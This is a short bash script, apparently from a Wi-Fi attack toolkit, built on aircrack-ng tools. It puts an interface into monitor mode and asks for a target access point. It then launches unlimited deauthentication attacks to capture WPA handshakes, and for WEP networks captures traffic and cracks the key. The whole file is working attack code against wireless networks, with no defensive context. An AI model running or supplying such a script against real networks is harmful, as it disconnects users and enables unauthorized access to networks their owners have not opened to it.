#!/bin/bash

# all handshake encryption

red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"

echo ' '

Interface=$2

airmon-ng start $Interface

MON=mon

if [ $1 == 1 ]
then
# Handshake all
airodump-ng $Interface$MON

echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " BSSID
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CHANNL
read -p "[$(echo -e $blue"?"$reset)] Enter ESSID : " ESSID

airodump-ng $Interface$MON -d $BSSID -c $CHANNL

xterm -hold -e airodump-ng -w $ESSID -c $CHANNL --bssid $BSSID $Interface$MON & xterm -hold -e aireplay-ng --deauth 0 -a $BSSID $Interface$MON

airmon-ng stop $Interface$MON

elif [ $1 == 2 ]
then
# Handshake WEP
airodump-ng $Interface$MON --encrypt WEP

read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " BSSID
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CHANNL

besside-ng $Interface$MON -c $CHANNL -b $BSSID

aircrack-ng ./wep.cap

airmon-ng stop $Interface$MON

elif [ $1 == 3 ]
then
# Handshake WPA
airodump-ng $Interface$MON --encrypt WPA

read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " BSSID
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CHANNL
read -p "[$(echo -e $blue"?"$reset)] Enter ESSID : " ESSID

airodump-ng $Interface$MON -d $BSSID -c $CHANNL

xterm -hold -e airodump-ng -w $ESSID -c $CHANNL --bssid $BSSID $Interface$MON & xterm -hold -e aireplay-ng --deauth 0 -a $BSSID $Interface$MON

airmon-ng stop $Interface$MON

fi
